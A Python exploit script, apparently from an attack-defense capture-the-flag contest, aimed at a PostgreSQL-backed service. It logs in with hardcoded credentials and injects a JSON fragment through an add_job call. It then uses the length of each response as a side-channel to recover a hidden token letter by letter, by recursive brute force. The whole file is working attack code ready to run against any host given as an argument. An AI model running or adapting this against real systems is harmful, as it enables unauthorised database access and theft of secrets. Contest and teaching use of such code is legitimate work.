#!/usr/bin/env python3.8
import json
import os
import random
import sys
import traceback
from os.path import exists
from time import time

import pg8000
import uuid

import requests
from requests.exceptions import Timeout
from requests.adapters import HTTPAdapter
from urllib3.util import Retry
from gornilo import CheckRequest, Verdict, PutRequest, GetRequest, VulnChecker, NewChecker

PG_PORT = 5432
DOCTOR_PORT = 18181

from string import ascii_uppercase

class PgErrorChecker:
    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, exc_traceback):
        if exc_type:
            print(exc_type)
            print(exc_value)
            traceback.print_tb(exc_traceback, file=sys.stdout)
        return True


class PgConn:
    def __init__(self, hostname):
        self.hostname = hostname

    def __enter__(self):
        self.conn = pg8000.connect("svcuser", host=self.hostname, password="svcpass", database="postgres", port=PG_PORT)
        return self

    def __exit__(self, type, value, traceback):
        if self.conn:
            self.conn.close()


def get_len(hostname, payload):
    with PgErrorChecker() as registry_ec, PgConn(hostname) as pgc:
        cursor = pgc.conn.cursor()
        cursor.execute("SELECT add_job('%s', '%s')" % (str(uuid.uuid4())[:4], '\","token_validation_message\":\"%s_21' % payload))
        pgc.conn.commit()
        rows = cursor.fetchall()

        if not rows or len(rows) != 1 or len(rows[0]) != 1:
            return Verdict.MUMBLE("unexpected registry service response")

        rc = len(rows[0][0])
        cursor.close()
        return rc

def first_iter(hostname):
    freqs = []
    for letter in ascii_uppercase:
        length = get_len(hostname, letter)
        freqs.append((length, letter))
        print("curr: %s, len: %d\n" % (letter, length))

    f_min = min(freqs)[0]

    f_freqs = [freq for freq in freqs if freq[0] == f_min]
    print("INITIAL FREQS: %v", f_freqs)

    res = []

    for f in f_freqs:
        next_f = find_freqs(f[1], f_min, hostname, 1)
        res.append(next_f)

    return res

def find_freqs(curr_str, curr_len, hostname, i):
    if i == 10:
        return (curr_str, curr_len)
    freqs = []
    for letter in ascii_uppercase:
        length = get_len(hostname, curr_str+letter)
        if length > curr_len:
            continue

        freqs.append((length, letter))
        print("curr: %s, len: %d\n" % (curr_str + letter, length))

    if len(freqs) == 0:
        return ("failed", 9999999999999)

    f_min = min(freqs)[0]

    f_freqs = [freq for freq in freqs if freq[0] == f_min]

    next_freqs = []
    for f in f_freqs:
        next_f = find_freqs(curr_str+f[1], f[0], hostname, i + 1)
        next_freqs.append(next_f)

    return next_freqs


def main(hostname):
    #print(get_len(hostname, "E"))
    print(first_iter(hostname))


if __name__ == '__main__':
    main(sys.argv[1])
